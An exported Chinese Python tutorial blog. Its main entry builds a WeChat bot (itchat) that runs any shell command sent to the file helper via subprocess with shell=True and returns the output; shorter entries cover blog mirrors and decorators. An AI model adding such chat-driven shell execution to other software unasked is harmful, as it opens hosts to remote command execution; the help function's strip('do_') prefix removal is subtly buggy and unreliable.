            itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span>help_msg<span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>略<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> <code>(。・∀・)ノ</code> 这没什么难度，用if语句判断一下text的内容，如果是<code>help</code>就把帮助信息发给消息助手，同学们可以试着运行下，扫码登录后用手机向文件助手发送消息<code>help</code>，可以看到结果。</p>
<h5 id="实现退出程序"><a href="#实现退出程序" class="headerlink" title="实现退出程序"></a>实现退出程序</h5><p>程序的运行是个死循环，虽然可以强制终止，但总有那么一点麻烦，如果把终止程序也做成一个指令就好了 <code>ヾ(≧∇≦*)ゝ</code></p>
<p>好！现在就来实现这个指令！</p>
<p>然而，程序怎么终止？</p>
<p>可以用到python内置的sys模块有一个函数叫做exit，这个函数可以不带参数直接调用，所以我们只需要在合适的位置调用这个函数就可以了。</p>
<p>我们给这个指令取个名字，就叫做<code>logout</code>，中文是登出的意思，登出了程序不就意味着结束了吗，下面是关键代码（不要忘了导入sys模块）：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>略<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
    <span class="token keyword">if</span> dst <span class="token operator">==</span> <span class="token string">'filehelper'</span><span class="token punctuation">:</span>
        <span class="token comment"># 发往消息助手的消息就是我们的命令</span>
        <span class="token keyword">if</span> text <span class="token operator">==</span> <span class="token string">'help'</span><span class="token punctuation">:</span>
            help_msg <span class="token operator">=</span> <span class="token string">'现在支持的命令有:\nhelp 获取帮助信息\n'</span>
            help_msg <span class="token operator">+=</span> <span class="token string">'logout 退出程序\n'</span>
            itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span>help_msg<span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> text <span class="token operator">==</span> <span class="token string">'logout'</span><span class="token punctuation">:</span>
            itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'退出程序...'</span><span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>略<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>补充</strong>：字符串可以用+号拼接到一起，<code>help_msg += &#39;logout 退出程序\n&#39;</code>也就是给help_msg的尾部拼接字符串<code>&#39;logout 退出程序\n&#39;</code>，<code>\n</code>是换行符，这些在前面的教程中可能没有提到，关于字符串的操作，下一节详细介绍。</p>
<p>读者们运行程序，发送退出指令后会发现，程序报错，命令行会输出像下面这样的信息：</p>
<pre class="line-numbers language-none"><code class="language-none">    r &#x3D; replyFn(msg)
  File &quot;main.py&quot;, line 18, in handler
    sys.exit()
SystemExit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>除此之外，程序并没有退出。在这里解释一下，其实sys.exit()只是发送了一个终止的信号，itchat捕抓了这个信号，不给这个信号发送给系统，阻止我们非正常退出。</p>
<p>嗯，非正常。</p>
<p>不必慌张！itchat提供了一个logout函数让我们退出微信登录，itchat退出了微信登录就自然地退出程序了，让我们修改程序如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>略<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
        <span class="token keyword">elif</span> text <span class="token operator">==</span> <span class="token string">'logout'</span><span class="token punctuation">:</span>
            itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'退出程序...'</span><span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span>
            itchat<span class="token punctuation">.</span>logout<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>略<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="实现执行系统命令"><a href="#实现执行系统命令" class="headerlink" title="实现执行系统命令"></a>实现执行系统命令</h5><p>说好的远程控制电脑，怎么可以什么都干不了？</p>
<p>下面就来实现真正的控制电脑的操作！ <code>ヾ(≧∇≦*)ゝ</code></p>
<p>我们来实现给定指令运行系统命令！</p>
<p>什么是系统命令？就是命令行里运行的那些咯 <code>(ˉ^￣～) 切~~</code></p>
<p>呃，这个……我们不能像远程桌面那样直接使用鼠标和键盘操作，水平还不足（其实是我不会 <code>(￣_,￣ )</code>），就实现这个吧。</p>
<p>这个功能对于新手来说，也是有一定的难度的，要多加注意！</p>
<p><code>&lt;(￣︶￣)↗[GO!]</code></p>
<h6 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h6><p>要执行系统命令，可以用到subprocess模块，这个模块也是python内置的，我们只需要使用其中一个check_output函数就可以了，这个函数有挺多参数的，但是必要的参数不多，这里我给出我们的用法：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'发生错误了！'</span><span class="token punctuation">,</span><span class="token string">'filehelper'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里接触到后面教程的内容，这里先解释一下，这个try是一个代码块，会捕捉程序中发生的错误（称为<em>异常</em>），如果捕捉到异常就会执行except代码块，同学们先用着先就好了。</p>
<p>上面的函数调用中，cmd就是我们要执行的系统命令的字符串，<code>shell=True</code>不用管，timeout表示超时时间，单位为秒，超时会发生<em>异常</em>，其次，程序的运行输出会做为返回值返回。</p>
<p>这个返回值是字节串类型的，这是python的一种基本数据类型，之前的教程没有提到，不过不重要，我们只要知道使用<code>result.decode()</code>就可以把字节串解码成字符串就够了。</p>
<h6 id="从消息中分离命令"><a href="#从消息中分离命令" class="headerlink" title="从消息中分离命令"></a>从消息中分离命令</h6><p>至于要执行的命令怎么获取，又要接触到后面的知识了，字符串、数字、列表等类型的值都是一个 <em>“对象”</em>，对象都有自己的 <em>“方法”</em>，方法其实就是函数，不过这种函数的调用方式不太一样：</p>
<pre class="line-numbers language-none"><code class="language-none">对象.方法名()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这有点像调用模块内的函数一样，其实上面的<code>result.decode()</code>就是调用了一个方法。</p>
<p>我们要用到字符串的一个方法：split</p>
<p>split用于分割字符串，指定一个分隔符，字符串就会以这个分隔符从左往右分割成多个字符串，然后一列表返回，比如以空格分割<code>&#39;hello world&#39;</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello world!'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'world!'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们还可以指定一个参数表明最大分割的次数。注意！是分割的次数，不是分割成多少个字符串！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'1 2 3 4'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2 3 4'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>那么，我们只需要在发送消息的时候用以下格式：</p>
<pre class="line-numbers language-none"><code class="language-none">指令 其它内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>(｡･∀･)ﾉﾞ</code> 然后使用split分割开来就可以了！</p>
<h6 id="改动程序框架"><a href="#改动程序框架" class="headerlink" title="改动程序框架"></a>改动程序框架</h6><p>在这里我们顺便改变一下程序的基本框架，下面说下原因。</p>
<p>我们每次添加命令都要改动help指令的输出（help_msg），有点麻烦，不如我们把每个指令的处理过程写成一个函数，然后在函数的开头加上字符串，这个字符串会成为函数对象（没错！函数也是一种对象）的<code>__doc__</code>属性，之后我们的help指令把所有处理函数的这个属性作为帮助信息发给文件助手就可以了！</p>
<p>对此，我干脆来了一个大“整改”，我们把每个指令的处理函数都定义在文件<code>handlers.py</code>中，然后<code>main.py</code>的程序框架就是这样的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itchat
<span class="token keyword">import</span> handlers  <span class="token comment"># 导入我们写的模块</span>

<span class="token decorator annotation punctuation">@itchat<span class="token punctuation">.</span>msg_register</span><span class="token punctuation">(</span><span class="token string">'Text'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dst <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'ToUserName'</span><span class="token punctuation">]</span>
    text <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'Text'</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> dst <span class="token operator">==</span> <span class="token string">'filehelper'</span><span class="token punctuation">:</span>
        text <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 以空格分开</span>
        cmd <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># 指令的名字</span>
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>handlers<span class="token punctuation">,</span> <span class="token string">'do_'</span><span class="token operator">+</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
            func <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>handlers<span class="token punctuation">,</span> <span class="token string">'do_'</span><span class="token operator">+</span>cmd<span class="token punctuation">)</span>
            func<span class="token punctuation">(</span>text<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    itchat<span class="token punctuation">.</span>auto_login<span class="token punctuation">(</span><span class="token punctuation">)</span>
    itchat<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面又出现了新的函数，hasattr和getattr。</p>
<p>hasattr用来查询某个对象是否有某个属性，第一个参数就是这个对象，这里是我们自己写的handlers模块，也就是handlers.py，模块也是对象哦！，第二个参数就是属性，这里查找的属性就是我们的处理函数，我们的处理函数统一命名为下面这种格式：</p>
<pre class="line-numbers language-none"><code class="language-none">do_指令名
例：
do_help   
do_logout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>getattr用来获取对象的属性，利用这个函数，我们就可以获取相应的函数赋值给变量func，然后调用<code>func(text)</code>。</p>
<p>与此同时，我们在handlers.py定义的help指令处理函数如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">do_help</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token string">'输出帮助信息'</span>

    <span class="token comment"># 这个arg参数占位用</span>

    obj <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取全局命名空间</span>
    help_msg <span class="token operator">=</span> <span class="token string">'支持的指令有:\n'</span>
    <span class="token keyword">for</span> name <span class="token keyword">in</span> obj<span class="token punctuation">:</span>
        <span class="token comment"># 遍历所有对象</span>
        <span class="token keyword">if</span> name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'do_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># startswith方法用于判断字符串是否以所给字符串开头</span>

            command <span class="token operator">=</span> name<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'do_'</span><span class="token punctuation">)</span>  <span class="token comment"># 去除字符串中的'do_'</span>
            help_msg <span class="token operator">+=</span> command <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> obj<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span>__doc__ <span class="token operator">+</span> <span class="token string">'\n'</span>

    itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span>help_msg<span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码用上了两个新的字符串对象的方法，看看注释就好了。</p>
<p>读者们自己加上do_logout函数吧，这里就不多罗嗦了（记得导入itchat模块！！！）</p>
<h6 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h6><p>做了这么多铺垫，可能大家也忘了我们要干什么了。我们要实现执行系统命令！</p>
<p>现在我们只需在handlers.py文件中添加一个函数就好了：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">do_exec</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token string">'执行系统命令'</span>
    cmd <span class="token operator">=</span> arg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 命令</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token string">'执行命令出错了！'</span>

    itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后不要忘了在handlers.py文件中加上导入相关模块的语句</p>
<hr>
<h3 id="运行演示"><a href="#运行演示" class="headerlink" title="运行演示"></a>运行演示</h3><p>好了，我们的项目就这样完成了，现在给出几张运行时的图片。</p>
<p>这是程序运行的输出画面，此时正在等待扫描二维码<br><img src="/images/3ca79d2c/start.png" alt="等待扫码"></p>
<p>登录成功<br><img src="/images/3ca79d2c/login.png" alt="登录成功"></p>
<p>此时手机发送指令<br><img src="/images/3ca79d2c/int.jpg" alt="发送指令"></p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>程序的完整代码上传到github上了，地址是：<a href="https://github.com/featherL/WeChatController/tree/master">https://github.com/featherL/WeChatController/tree/master</a></p>
<p>这一节我们不仅把之前几节的内容综合起来，做了一个完整的项目，而且了解了很多后面探讨的内容。对于这些“超纲”内容，某些地方不太懂也没关系，等学到了的时候，再回头看，你会发现是如此的简单。</p>
<p>如有不懂，欢迎评论，或者邮件联系我 <a href="mailto:1343145150@qq.com">1343145150@qq.com</a></p>
]]></content>
      <categories>
        <category>python教程</category>
        <category>python小项目</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>公告·关于博客的发布</title>
    <url>/be7e62bd/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本人的博客文章同步更新到下面主页：</p>
<ul>
<li>个人站点<a href="http://xi4oyu.top/">http://xi4oyu.top/</a></li>
<li>CSDN <a href="https://blog.csdn.net/lonely_feather">https://blog.csdn.net/lonely_feather</a></li>
<li>博客园 <a href="http://www.cnblogs.com/featherl/">http://www.cnblogs.com/featherl/</a></li>
</ul>
]]></content>
      <categories>
        <category>公告</category>
      </categories>
      <tags>
        <tag>公告</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（三）·函数进阶（下）</title>
    <url>/30020b82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>下半部分果然很快到来，这次介绍函数的更高级用法，装饰器！<span id="more"></span></p>
<h3 id="函数嵌套"><a href="#函数嵌套" class="headerlink" title="函数嵌套"></a>函数嵌套</h3><p>先来说说函数嵌套，python中的函数是可以嵌套的，也就是说可以将一个函数放在另一个函数里面，比如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> inner
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> func1 <span class="token operator">=</span> outer<span class="token punctuation">(</span><span class="token string">'feather'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> func2 <span class="token operator">=</span> outer<span class="token punctuation">(</span><span class="token string">'Lee'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> func1<span class="token punctuation">(</span><span class="token punctuation">)</span>
feather
<span class="token operator">>></span><span class="token operator">></span> func2<span class="token punctuation">(</span><span class="token punctuation">)</span>
Lee
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>你没看错，我们在函数里面定义了另一个函数，并把这个函数返回了？</p>
<p>返回出来的函数是带着它的所在的作用域的，这就是为什么返回出来的函数仍能访问外层函数的变量name，而且可以看到<code>func1()</code>和<code>func2()</code>结果不一样，这表明每次调用外层函数都会重新定义内层函数，事实也是如此。</p>
<h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>再来看看下面这个函数，<code>&lt;(￣︶￣)↗</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>  <span class="token comment"># pass的意思是什么都不做</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这段函数只是空转100000次没什么意义，只是做个例子，假如我们想要运使用这个函数并输出运行了多长时间，我们可以这么做：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>  <span class="token comment"># pass的意思是什么都不做</span>

<span class="token comment"># 获取当前时间戳，时间戳就是当前到1970年所经过的秒数</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  
func<span class="token punctuation">(</span><span class="token punctuation">)</span>
end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以在函数前后分别获取时间，两个时间的差就是函数的运行时间，这很简单。可是，如果我们有很多个函数都需要统计时间怎么办？每个函数调用前都加上同样的代码吗？</p>
<p>当然不是，受函数嵌套的启发，我们可以像下面这样定义一个函数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    <span class="token keyword">return</span> inner<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后把要计算运行时间的函数作为参数传给count函数，就是把count函数当一个代理人，替我们调用函数。</p>
<p>但是这样的话，调用func函数不能写<code>func()</code>，要写<code>count(func)</code>，有点别扭，再改进下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    <span class="token keyword">return</span> inner    <span class="token comment"># 返回这个内层函数，而不是调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果再执行了这样的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">func <span class="token operator">=</span> count<span class="token punctuation">(</span>func<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个什么意思？</p>
<p>其实就是把<code>func</code>这个变量（函数也可理解成一种变量）重新绑定成count里面定义的inner()函数。这个时候我们再执行<code>func()</code>就可以达到效果了，完整代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>  <span class="token comment"># pass的意思是什么都不做</span>

<span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 获取当前时间戳，时间戳就是当前到1970年所经过的秒数</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  
        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    <span class="token keyword">return</span> inner

func <span class="token operator">=</span> count<span class="token punctuation">(</span>func<span class="token punctuation">)</span>
func<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>装饰器</strong>的雏形出来了！<strong>装饰器</strong>就是像count这样的函数，用来给其它函数增加额外的功能，count函数在里面定义了一个inner函数用来包裹（装饰）被装饰的函数func。</p>
<p>不过这仅仅是<strong>雏形</strong>，并不是真正的装饰器，现在该让真正的装饰器登场了！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 获取当前时间戳，时间戳就是当前到1970年所经过的秒数</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  
        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    <span class="token keyword">return</span> inner
    
<span class="token decorator annotation punctuation">@count</span>
<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>  <span class="token comment"># pass的意思是什么都不做</span>
        
func<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在函数<code>func()</code>的上面多了样东西：<code>@count</code>，这个东西就是装饰器，它的本质等同于<code>func = count(func)</code>。这样以后，每当我们需要为哪个函数的增加输出运行时间的功能，就在这个函数的定义前加上<code>@count</code>。</p>
<h4 id="万能的-和"><a href="#万能的-和" class="headerlink" title="万能的*和**"></a>万能的<code>*</code>和<code>**</code></h4><p>如果func函数的参数数量不确定，我们可以使用参数收集和分配参数的技巧，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># “百搭”的参数定义</span>
    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
